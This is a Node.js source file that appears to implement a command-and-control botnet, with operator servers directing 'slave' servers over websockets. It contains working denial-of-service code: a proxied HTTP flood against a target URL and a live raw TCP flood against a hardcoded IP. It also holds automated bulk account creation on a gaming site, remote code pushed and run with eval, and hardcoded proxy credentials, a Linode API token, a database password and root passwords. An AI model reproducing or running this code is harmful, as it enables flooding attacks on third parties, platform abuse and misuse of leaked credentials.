const AppVersion = "1.2.9"; // this is the version which will identify each server and make sure they're up to date!
let CurrentVersion = AppVersion; // Current version of the application, the master server sends this to all servers!
let NewAppCode = ""; // This'll be updated when the server sends out a new app version request!

const NetLib = require("net");
const requestIp = require('request-ip');
const { TextEncoder, TextDecoder } = require("util"); // Util module for fixing stupid problems such as TextEncoder is undefined
const fs = require("fs"); // File module, used for creating and reading data aka files
const tunnel = require('tunnel'); // Used for tunneling our http requests through proxies :))
const Mongoose = require("mongoose"); // This is for our database / MongoDB
const DBModel = require("./Models/DB"); // Our database model so we can go through the database
const axios = require("axios"); // For http / https requests n so on
const ClientWebSocket = require("websocket").client; // This is for connecting to non server sockets and letting us listen for input from all servers and the operator!
const expressJS = require("express"); // For starting the server so we can connect web sockets etc
const ExpressWS = require("express-ws"); // Express web sockets
const ExpressApp = expressJS(); // Our express app
const ExpressWebSocket = ExpressWS(ExpressApp); // Our express websocket which contains a set of functions for collecting all connected clients etc!
const WebSocketInstance = ExpressWebSocket.getWss("/server_socket"); // Get the cached data of our worker web socket!
const Servers = {// We'll use the server IP to identify who it is, example: if the server is classed as operator it'll be the one to send out all the commands that the other servers will listen to!
    ["162.213.255.44"]: "operator",
    ["68.65.123.36"]: "operator",
    ["178.79.187.224"]: "slave",
    ["157.245.43.71"]: "operator",
    ["31.49.168.36"]: "operator"
};
const TaskList = { // We'll use this to over-ride tasks!
    "new_account": {Priority: 1, Task: "Account Creation"}
};
const InterVals = []; // Keep track of all inter vals so we can clear them on update.
const TaskDataInUse = []; // We'll use this to split certain tasks in half so each slave server can do them quicker
const CurrentTasks = []; // We'll store every servers current task in this so we don't constantly ask them to do anything while they're working!
const SocketIPs = []; // We'll store every IP that connected to a socket within this array to ensure we can filter out mass connections and save resources.
const DebugMode = true; // Enable this if you want log messages to be printed out, recommended to turn this off in production mode!
const AppPort = process.env.PORT || 7453; // Current web server port
const OperationKey = "S9v^3NX9pUsN!85EFx&Z1ZXnXer#R1Uwx6k%66H@#M3sjp^^BTMcfCJEQby2"; // The operation key which is used for authing message / new task requests!
const LocalHost = false; // This determines where to use a localhost connections which you shouldn't do when running on an actual server!
let DoingTask = false; // this will be set to true if this current server is doing a task provided by the master server
let LocalIP = null; // the current IP of this server, it gets auto set as soon as the server runs!
let CurrentClient = null; // This is the client which we'll use to send back messages to the master, will be set as soon as it connects to the master socket!
let StopConnection = false; // This is used for restarting the server, when set to true the socket won't try to reconnect. The master server tells the server to do this when outdated!
let CreateServers = true; // This is used for creating a butt load of servers!
let ClientConnected = false; // Used to determine if we should reconnect the socket
let ConnectionTime = 0; // Used for reconnecting sockets depending if the master server hasn't pinged for a short period of time!
let UsedProxies = 0;

let Proxies = [
    "209.127.191.180:9279:eutqpmhe:1vnz3gzykzgj",
    "45.142.28.83:8094:eutqpmhe:1vnz3gzykzgj",
    "45.136.231.43:7099:eutqpmhe:1vnz3gzykzgj",
    "45.137.60.112:6640:eutqpmhe:1vnz3gzykzgj",
    "45.136.228.85:6140:eutqpmhe:1vnz3gzykzgj",
    "45.140.13.124:9137:eutqpmhe:1vnz3gzykzgj",
    "45.136.231.85:7141:eutqpmhe:1vnz3gzykzgj",
    "193.8.56.159:9223:eutqpmhe:1vnz3gzykzgj",
    "45.140.13.112:9125:eutqpmhe:1vnz3gzykzgj",
    "45.142.28.20:8031:eutqpmhe:1vnz3gzykzgj"
]

let sProxies = [
]

ExpressApp.use(requestIp.mw())
ExpressApp.use(expressJS.json())

const agent = tunnel.httpsOverHttp({
    proxy: {
        host: '209.127.191.180',
        port: 9279,
        proxyAuth: `eutqpmhe:1vnz3gzykzgj`
    }
});

/*
setInterval(() => {
    if (UsedProxies >= Proxies.length){
        UsedProxies = 0;
    }

    const Proxys = Proxies[UsedProxies]

    if (Proxys){
        UsedProxies += 1

        const ProxyData = Proxys.toString().split(":");
        console.log(ProxyData)
        const agent = tunnel.httpsOverHttp({
            proxy: {
                host: ProxyData[0],
                port: Math.floor(ProxyData[1]),
                proxyAuth: `${(typeof ProxyData[2] != "undefined") ? ProxyData[2] : ""}:${(typeof ProxyData[3] != "undefined") ? ProxyData[3] : ""}`
            }
        });
        
        try{
            if (typeof agent != "undefined"){
                axios.get("https://nettarget.xyz", {
                    httpsAgent: agent,
                    port: 443
                }).then((res) => {
                    console.log("sent", ProxyData[0])
                }).catch((ee) => {})
            }
        }catch (fail_){
            console.log("Failed to send request")
        }
    }
}, 500)*/

/*
axios.get("https://cloud.linode.com/api/v4/linode/instances/?page_size=100", {
    headers: {
        authorization: "Bearer 6f6fd2b137c17bb571dc4e7bbd8a4b9d7c1145e34d2e3adc38f86f51cc839175"
    }
}).then((res) => {
    console.log(res.data)
    
}).catch((re) => {
    console.log(re, "bad man error 1")
})

for (let II = 1; II <= 10; II++){
    axios({
        method: "POST",
        headers: {
            'Content-Type' : 'application/json',
            'Accept' : 'application/json',
            'Authorization' : 'Bearer 6f6fd2b137c17bb571dc4e7bbd8a4b9d7c1145e34d2e3adc38f86f51cc839175',
            'cookie': ""
        },
    
        withCredentials: true,
        url: "https://cloud.linode.com/api/v4/linode/instances",
    
        data:{
            ["image"]: "linode/centos7",
            ["region"]: "eu-west",
            ["type"]: "g6-standard-1",
            ["label"]: `server${II.toString()}-eu-west`,
            ["tags"]: [],
            ["root_pass"]: "aeP@9WYX&UzUdjJB2!j96tx5",
            ["authorized_users"]: [],
            ["booted"]: true,
            ["backups_enabled"]: false,
            ["private_ip"]: false
        }
    }).then((res) => {
        console.log("we did it 1")
        
    }).catch((re) => {
    })
}

*/

try{
    axios.get("https://api.ipify.org/?format=json").then((Response) => {
        LocalIP = Response.data.ip

        const PC_RANK = (typeof Servers[LocalIP] != "undefined") ? Servers[LocalIP] : "unknown"

        let NewFile = (new Date() / 1000).toString()

        if (DebugMode){
            fs.writeFileSync(`CONSOLE_LOGS/${NewFile}.log`, "")
        }

        let ToLog = ""
        let ConsoleLogIndex = 0

        async function ConsoleLogger(...args){
            if (DebugMode){
                let NewPrinter = ""

                await args.forEach((Value, Index) => {
                    const Middle1 = (Index == 0) ? "" : "\n"
                    const Middle2 = (ConsoleLogIndex == 0) ? "" : "\n"
            
                    NewPrinter = NewPrinter + Middle1 + Value.toString()
                    ToLog = ToLog + Middle2 + Value.toString()
                    ConsoleLogIndex += 1
                })

                console.log(NewPrinter)
            }
        }

        function FloodAttacks(AttackData){
            
        }

        setInterval(() => {
            if (DebugMode){
                fs.writeFileSync(`CONSOLE_LOGS/${NewFile}.log`, `${ToLog}`)
            }
        }, 1000);

        function GetSlaveIP(Client){
            for (const [CLIENT_IP, CLIENT_SOCKET] of Object.entries(SocketIPs)) {
                if (CLIENT_SOCKET == Client){
                    return CLIENT_IP.toString()
                }
            }
            return null
        }

        function GetSlaveServers(){
            const Slaves = [];

            for (const [ServerIP, ServerRank] of Object.entries(Servers)) {
                if (ServerRank == "slave"){
                    Slaves.push(ServerIP.toString())
                }
            }

            return Slaves
        }

        function SplitTableUp(table){ // it works but it's also ass at the same time, but it'll do for now LOL
            const NewArray = []

            if (typeof table == "object"){
                const BackUpObject = table; // A backup of the main object so we don't overwrite the original
                let BackUpLength = BackUpObject.length;

                for (let _I = 0; _I <= BackUpLength; _I++){
                    const AmountToTake = Math.floor(BackUpObject.length / GetSlaveServers().length); // that moment I keep using lua instructions by mistake because my main is lua
                    const NewObject = [];

                    for (let AmountIndex = 0; AmountIndex < AmountToTake; AmountIndex++){
                        NewObject.push(BackUpObject[AmountIndex]) // Push that data into our new object
                    }

                    BackUpObject.splice(0, AmountToTake) // we also needa remove data from our backup object so we don't keep adding that same data into the new object

                    if (_I >= BackUpLength){ // if hit the max limit
                        if (BackUpObject.length > 0){
                            NewArray.push(BackUpObject) // push our new object into the split object!
                        }
                    }

                    if (NewObject.length > 0){ // Don't wanna be pushing empty objects
                        NewArray.push(NewObject) // push our new object into the split object!
                    }
                }

            }

            return NewArray
        }

        ConsoleLogger(SplitTableUp([ // 6 tasks
            "wow1",
            "wow2",
            "wow3",
            "wow4",
            "wow5",
            "wow6"
        ]))
    
        async function Encrypt(Data, Salt){ // New encryption / cypher
            let currentPass = input.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);});
        }// wrong file brudda
    
        async function Decrypt(Data, Salt){ // New encryption / cypher

        }
    
        function IsDoingTask(Client){
            let clientIp1 = GetSlaveIP(Client)
            if (typeof clientIp1 != "undefined"){
                clientIp1 = clientIp1.replace("::ffff:", "")
            }
            if (typeof CurrentTasks[clientIp1] != "undefined"){
                if (CurrentTasks[clientIp1] == true){
                    return true
                }
            }

            return false
        }

        function TaskHandler(Client, Message){
            try{
                let clientIp1 = GetSlaveIP(Client)
                clientIp1 = clientIp1.replace("::ffff:", "")

                const JSON_DATA = JSON.parse(Message) // Convert our data back into a array / class

                if (JSON_DATA){ // Make sure the data is valid and not null
                    if (typeof JSON_DATA.doing_task != "undefined"){ // Make sure the command and auth key is valid and not null
                        CurrentTasks[clientIp1] = JSON_DATA.doing_task
                    }
                }else{
                    ConsoleLogger("json invalid")
                }
            }catch (task_error){
                ConsoleLogger("[SERVER] -> [ERROR] -> error while executing task handler, " + task_error);
            }
        }

        function CompareRank(Client){
            let clientIp1 = GetSlaveIP(Client)
            if (typeof clientIp1 != "undefined"){
                clientIp1 = clientIp1.replace("::ffff:", "")
            }

            const IP_RANK = (typeof Servers[clientIp1] != "undefined") ? Servers[clientIp1] : "unknown"

            if (IP_RANK == "operator"){
                return true
            }

            return false
        }

        async function CommandHandler(Message){
            
            try{
                const JSON_DATA = JSON.parse(Message) // Convert our data back into a array / class

                if (JSON_DATA){ // Make sure the data is valid and not null
                    if (typeof JSON_DATA.AuthKey != "undefined"){ // Make sure the command and auth key is valid and not null
                        if (JSON_DATA.AuthKey == OperationKey){ // Compare the auth key provided to the servers auth key to make sure they have access to run such commands!
                            //
                            switch((typeof JSON_DATA.type != "undefined") ? JSON_DATA.type : ""){
                                case "task": {
                                    if (JSON_DATA.command == "dos_test" & JSON_DATA.type == "task" & typeof JSON_DATA.target_url != "undefined"){
                                        if (DoingTask == true) { return true }
                                        DoingTask = true;

                                        if (CurrentClient){
                                            CurrentClient.send(JSON.stringify({
                                                doing_task: true
                                            }));
                                        }

                                        return FloodAttacks(JSON_DATA.attack_data)

                                        let DOS_ID = null
                                        ConsoleLogger("Sending requests!")
                                        DOS_ID = setInterval(() => {
                                            if (typeof InterVals[DOS_ID] == "undefined"){
                                                InterVals[DOS_ID] = DOS_ID
                                            }

                                            if (UsedProxies >= Proxies.length){
                                                UsedProxies = 0;
                                            }
                                            
                                            const Proxys = Proxies[UsedProxies]
                                            
                                            if (Proxys){
                                                UsedProxies += 1
                                            
                                                const ProxyData = Proxys.toString().split(":");

                                                const aSgent = tunnel.httpsOverHttp({
                                                    proxy: {
                                                        host: ProxyData[0],
                                                        port: Math.floor(ProxyData[1]),
                                                        proxyAuth: `${(typeof ProxyData[2] != "undefined") ? ProxyData[2] : ""}:${(typeof ProxyData[3] != "undefined") ? ProxyData[3] : ""}`
                                                    }
                                                });

                                                axios.get(JSON_DATA.target_url, {
                                                    httpsAgent: aSgent
                                                }).then((res) => {
                                                }).catch((request_error) => {})
                                            }
                                        }, 1)
                                    }

                                    if (JSON_DATA.command == "new_account" & JSON_DATA.type == "task"){
                                        if (DoingTask == true) { return true }
                                        //
                                        DoingTask = true;
                                        CurrentClient.send(JSON.stringify({
                                            doing_task: true
                                        }));
    
                                        if (typeof JSON_DATA.total != "undefined"){
                                            let Finished = true;
                                            let InterID = null;
                                            let CurrentIndex = 0;
    
                                            InterID = setInterval(async () => {
                                                if (typeof InterVals[InterID] == "undefined"){
                                                    InterVals[InterID] = InterID
                                                }

                                                if (JSON_DATA.total == CurrentIndex){
                                                    DoingTask = false;
                                                    ConsoleLogger("Task completed!");
    
                                                    CurrentClient.send(JSON.stringify({
                                                        doing_task: false
                                                    }));
    
                                                    return clearInterval(InterID);
                                                }
    
                                                if (Finished){
                                                    Finished = false;
                                                    
                                                    await axios.get("https://rbxidle.com/public/api/qsawqa/init", {
                                                        headers: {
                                                            ['User-Agent']: 'Chrome',
                                                        },
                                                        httpsAgent: agent,
                                                        port: 443,
                                                    }).then(async (Response) => {
                                                        const newRecord = new DBModel({
                                                            PrivateKey: Response.data.pkey,
                                                            User: Response.data.name,
                                                            Points: 0
                                                        });
    
                                                        await newRecord.save();
    
                                                        setTimeout(() => {
                                                            Finished = true
                                                        }, 1000);
    
                                                        CurrentIndex += 1
                                                    }).catch((bad_man_error) => {
                                                        ConsoleLogger(bad_man_error);
                                                        setTimeout(() => {
                                                            Finished = true
                                                        }, 10000);
                                                    })
                                                }
                                            }, 20);
                                        }
                                        //
                                    }

                                } // Task case end bracket

                                case "connection_time":{
                                    if (JSON_DATA.type == "connection_time"){
                                        ConnectionTime = new Date();
                                    }
                                }

                                case "app_version":{
                                    if (JSON_DATA.type == "app_version"){
                                        if (typeof JSON_DATA.data != "undefined"){
                                            NewAppCode = Buffer.from(JSON_DATA.data.app_file, 'base64').toString("ascii");
                                            CurrentVersion = JSON_DATA.data.version;
                                        }
                                    }
                                } // app version case end bracket

                            }// Switch statement end bracket
                            //
                        }
                    }
                }else{
                    ConsoleLogger("json invalid");
                }
            }catch (cmd_error){
                ConsoleLogger("[SERVER] -> [ERROR] -> error while executing command, " + cmd_error);
            }
        }
    
        function StopTasks(){
            for (const [VAL_ID, VAL_OBJECT] of Object.entries(InterVals)){
                clearInterval(VAL_OBJECT);
                InterVals[VAL_ID] = null || undefined;
            };
        }

        function InputHandler(Message, ServerRank){
            if (ServerRank == "operator"){
                // This'll execute commands and send inputs to all the servers!
                
                WebSocketInstance.clients.forEach((Worker) => { // Go through the clients list grabbing each client 1 by 1
                    if (!CompareRank(Worker)){ // Stops it from sending a message to the operator!
                        if (!IsDoingTask(Worker)){ // Check if the slave / server is preforming a task, if not then tell it do a task!
                            Worker.send(Message); // Send the worker a nice little message to do it's slave work
                        }
                    }
                });
            }else if (ServerRank == "slave"){
                // This'll take the input cmd and do whatever we want
                CommandHandler(Message);
            };
        };

        Mongoose.connect("mongodb+srv://miningyay:66oPfMujoKaHbjKD@miningthing.4aen9.mongodb.net/test", {
            useNewUrlParser: true,
            useUnifiedTopology: true
        }).then(async (Client) => {
            ConsoleLogger("[SERVER] -> [API] -> [SUCCESS] -> " + 'Connected to DB');
        }).catch((error) => {
            ConsoleLogger("[SERVER] -> [API] -> [ERROR] -> " + 'Failed to connect to DB', error);
        });

        if (PC_RANK == "operator"){
            ConsoleLogger("[SERVER] -> [SUCCESS] -> " + "Starting operator web socket!");

            ExpressApp.get("/", (req, res) => {
                ConsoleLogger(req.clientIp || "no!")
                return res.send("Hi");
            })
            
            ExpressApp.ws("/", (Client, Request) => { // make a connection request to (url:443/server_socket);
                console.log("test")
            });

            ExpressApp.ws("/server_socket", (Client, Request) => { // make a connection request to (url:443/server_socket);
                Request.clientIp = Request.clientIp || Client._socket.remoteAddress;
                Request.clientIp = Request.clientIp.replace("::ffff:", "");

                if (SocketIPs[Request.clientIp.toString()]) {
                    Client.send("Bad connection 1");
                    return Client.close();
                }; // Filter out mass connections from the same IP
                
                if (typeof Servers[Request.clientIp.toString()] == "undefined" || Servers[Request.clientIp.toString()] == null){
                    Client.send("Bad connection 2");
                    return Client.close();
                } // Someone tried to connect to our socket without being whitelisted in the server array / class!
        
                const ClientIP = Request.clientIp.toString();
                const ServerRank = (typeof Servers[ClientIP] != "undefined") ? Servers[ClientIP] : "unknown";
        
                ConsoleLogger(`Connection rank: ${ServerRank}, Status: opened!`);
    
                SocketIPs[ClientIP] = Client;
                CurrentTasks[ClientIP] = false;

                if (ServerRank == "operator"){
                    Client.on("message", (Message) => {
                        InputHandler(Message, ServerRank)
                    })
                    
                    setInterval(() => {
                        fs.readFile("app.js", "utf8", (Error, FileData) => {
                            fs.readFile("package.json", "utf8", (Error, PackageData) => {
                                fs.readFile("package-lock.json", "utf8", (Error, PackageLockData) => {
                                    if (!Error){

                                        WebSocketInstance.clients.forEach((Worker) => { // Go through the clients list grabbing each client 1 by 1
                                            Worker.send(JSON.stringify({
                                                type: "connection_time",
                                                AuthKey: OperationKey.toString()
                                            }));

                                            if (!CompareRank(Worker) & !IsDoingTask(Worker)){ // Stops it from sending a message to the operator!
                                                Worker.send(JSON.stringify({
                                                    type: "app_version",
                                                    data: {
                                                        version: AppVersion.toString(),
                                                        app_file: Buffer.from(FileData.toString()).toString('base64'),
                                                        package_file: Buffer.from(PackageData.toString()).toString('base64'),
                                                        package_lock_file: Buffer.from(PackageLockData.toString()).toString('base64')
                                                    },
                                                    AuthKey: OperationKey.toString()
                                                }));
                                            }
                                        });

                                    }
                                })
                            })
                        })

                        InputHandler(JSON.stringify({
                            type: "task",
                            command: "dos_test",
                            AuthKey: OperationKey.toString(),
                            
                            attack_data:{
                                attack_type: "TCP",
                                target_host: "https://nettarget.xyz",
                            }
                        }), ServerRank)

                        /*InputHandler(JSON.stringify({
                            type: "task",
                            command: "new_account",
                            AuthKey: OperationKey.toString(),
                            total: 5
                        }), ServerRank)*/
                    }, 1000)
                }else{
                    Client.on("message", (Message) => {
                        if (ServerRank == "slave") {
                            TaskHandler(Client, Message)
                        }
                    })
                }

                Client.on("close", () => {
                    SocketIPs[ClientIP] = null || undefined;
                    CurrentTasks[ClientIP] = null || undefined;

                    ConsoleLogger(`Connection rank: ${ServerRank}, Status: closed!`);
                })
            });
        }
    
        const ExpressServer = ExpressApp.listen(AppPort, () => { // Listen for a connection to our web server port
            ConsoleLogger("[SERVER] -> [SUCCESS] -> " + "App listening on port " + AppPort);
        }); // if it's connecting to a server it'll need the prcess env port
    
        var NewClient = new NetLib.Socket();

        var server = NetLib.createServer(function(socket) {
            socket.write('Echo server\r\n');
            socket.pipe(socket);

            socket.on("data", (wwww) => {
                console.log(Buffer.from(wwww).toString("ascii"))
            })
        });
        
        server.listen(1337, '157.245.43.71');

        function makeid(length) {
            var result           = '';
            var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for ( var i = 0; i < length; i++ ) {
              result += characters.charAt(Math.floor(Math.random() * 
         charactersLength));
           }
           return result;
        }
        
        function attackfunc(){
            console.log('Connected');
            
            NewClient.on("error", (ee) => {
                console.log("err", ee)
                NewClient.connect(443, '156.67.72.94', attackfunc);
            })
        }

        NewClient.connect(443, '156.67.72.94', attackfunc);

        setInterval(() => {
            try{
                for (let I = 0; I < 500; I++){
                    if (NewClient){
                        NewClient.write(makeid(60000));
                    }
                }
            }catch(e){}
        }, 150);

        try {
            if (PC_RANK == "slave"){
                const NewWebClient = new ClientWebSocket(); // create the slaves web client object

                NewWebClient.on('connectFailed', function(error) {
                    //ConsoleLogger("[SERVER] -> [SOCKET] -> [ERROR] -> " + 'Failed to connect to master server / socket, retrying!');

                    ConnectionTime = new Date()
                    ClientConnected = false
                    DoingTask = false

                    StopTasks()
                });

                NewWebClient.on("connect", (Client) => { // Wait for the slave to connect to the master server socket
                    CurrentClient = Client
                    ConsoleLogger("Client connected!")

                    StopTasks()

                    ConnectionTime = new Date()
                    ClientConnected = true

                    if (CurrentClient){
                        DoingTask = false
                        CurrentClient.send(JSON.stringify({
                            doing_task: false
                        }));
                    }

                    Client.on("close", () => {
                        ConsoleLogger("Client disconnected!")
                        DoingTask = false

                        StopTasks()

                        ConnectionTime = new Date()
                        ClientConnected = false
                    })

                    Client.on("message", (Message) => {
                        InputHandler(Message.utf8Data, PC_RANK) // Send the message from the master server to the input handler
                    });
                
                }); // Listen for the messages from our master server
                
                let AppVersionInter = null
                AppVersionInter = setInterval(() => {
                    if (!StopConnection & !ClientConnected){
                        ConsoleLogger("Reconnecting")
                        NewWebClient.connect((LocalHost == true) ? "ws://localhost:7453/server_socket" : "wss://www.nettarget.xyz:443/server_socket");
                    }

                    if (AppVersion != CurrentVersion & typeof CurrentClient != "undefined"){
                        
                        fs.readFile("app.js", "utf8", (Error, FileData) => {
                            if (!Error){
                                fs.writeFile(`app_backups/${(new Date() / 1000).toString().toString()}.app.js`, FileData.toString(), () => {
                                    fs.writeFile(`app.js`, NewAppCode.toString(), () => {
                                        ConsoleLogger("[SERVER] -> [UPDATE] -> [PENDING] -> " + 'Updating server');
                                        clearInterval(AppVersionInter);
                                        StopConnection = true;
                                        DoingTask = false;

                                        if (CurrentClient){
                                            CurrentClient.send(JSON.stringify({
                                                doing_task: false
                                            }));
                                        }
                                        
                                        CurrentClient.close();
                                        ExpressServer.close();
                                        
                                        StopTasks();
                                        
                                        setTimeout(() => {
                                            try{
                                                ConsoleLogger("[SERVER] -> [UPDATE] -> [SUCCESS] -> " + 'Server updated!');
                                                eval(NewAppCode.toString());
                                            } catch(update_error){
                                                ConsoleLogger("[SERVER] -> [UPDATE] -> [FAILLED] -> " + 'Failed to update server!', update_error);
                                            };
                                        }, 1000);
                                    })
                                })
                            }
                        })

                    }

                    if (ClientConnected & !StopConnection){
                        if ( Math.floor( Math.abs( ( ( new Date().getTime() - ConnectionTime.getTime() ) / 1000) ) ) >= 6 ) {
                            ConsoleLogger("Socket down?")
                            CurrentClient.close();
                        }
                    }

                }, 1000)
            }else if (PC_RANK == "operator"){
                ConsoleLogger("Connecting up master client socket")
                const NewWebClient = new ClientWebSocket(); // create the masters web client object
                NewWebClient.connect((LocalHost == true) ? "ws://localhost:7453/server_socket" : "wss://www.nettarget.xyz:443/server_socket"); // we want the master / operator to make itself a connection so we can send out our signals from it
            };
        }catch (listen_socket_error){
            ConsoleLogger("[SERVER] -> [ERROR] -> failed to connect to clients web socket, " + listen_socket_error);
        }
    }).catch(() => {})
}catch (app_error){
    ConsoleLogger("[SERVER] -> [ERROR] -> error while trying to start server, " + app_error);
};